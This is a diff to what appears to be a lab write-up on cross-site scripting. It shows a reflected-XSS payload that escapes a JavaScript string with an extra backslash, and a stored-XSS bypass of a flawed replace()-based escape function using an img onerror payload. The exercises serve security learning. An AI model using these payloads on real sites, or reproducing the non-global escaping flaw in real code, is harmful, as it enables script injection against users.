@@ -387,17 +387,17 @@ In this instance, a script on the page processes reflected data (user input) wit
 
 4. In the response to my first payload attempt `test\"-prompt()}//`, the double quote is escaped by the application, so I add an extra backslash (`\`) to bypass it.
 
-  ~~~
-  1-st_Request: ?search=test"-prompt()}//
-  Response: {"results":[],"searchTerm":"test\"-prompt()}//"}
-  -
-  2-nd_Request: ?search=test\"-prompt()}//
-  Response: {"results":[],"searchTerm":"test\\"-prompt()}//"}
-  ~~~
+   ~~~
+   1-st_Request: ?search=test"-prompt()}//
+   Response: {"results":[],"searchTerm":"test\"-prompt()}//"}
+   -
+   2-nd_Request: ?search=test\"-prompt()}//
+   Response: {"results":[],"searchTerm":"test\\"-prompt()}//"}
+   ~~~
 
-  {: .box-note}
-  **Note:** The [Arithmetic Operators](https://www.w3schools.com/programming/prog_operators_arithmetic.php#gsc.tab=0) (`-`) forces `prompt()` to be parsed and executed as part of an expression. And ensuring it is executed immediately, not just ignored.
-  And the `//` comments out whatever is after it.
+   {: .box-note}
+   **Note:** The [Arithmetic Operators](https://www.w3schools.com/programming/prog_operators_arithmetic.php#gsc.tab=0) (`-`) forces `prompt()` to be parsed and executed as part of an expression. And ensuring it is executed immediately, not just ignored.
+   And the `//` comments out whatever is after it.
 
 </details>
 -
@@ -408,10 +408,29 @@ In this instance, the application's comment functionality is vulnerable to store
 <details markdown="1">
   <summary>Click me to expand the process</summary>
 
-1.
+1. Firstly, I look into the script used in the web application under the Network tab on the Inspection page. And I find there is an escape function using [replace()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace)
 
+   ```javascript
+    function escapeHTML(html) {
+        return html.replace('<', '&lt;').replace('>', '&gt;');
+    }
+   ```
 
+  {: .box-note}
+  **Note:** A string pattern will only be replaced once. To perform a global search and replace, use a regex with the g flag, or use replaceAll() instead.
 
+2. Now that I know only the first set of angle brackets is escaped and anything after that isn't, I craft my payload as:
+
+  ~~~
+  Payload: <><img src="x" onerror="prompt('I am escaped!')">
+  Rendered:
+    <p>
+      &lt;&gt;
+      <img src="x" onerror="prompt('I am escaped!')">
+    </p>
+  ~~~
+
+3. A prompt pops up with a message after I submit (store) the payload in the comment section, which indicates the filter mechanism (`replace()` function) was bypassed and the application is still vulnerable to XSS."
 
 </details>
 -
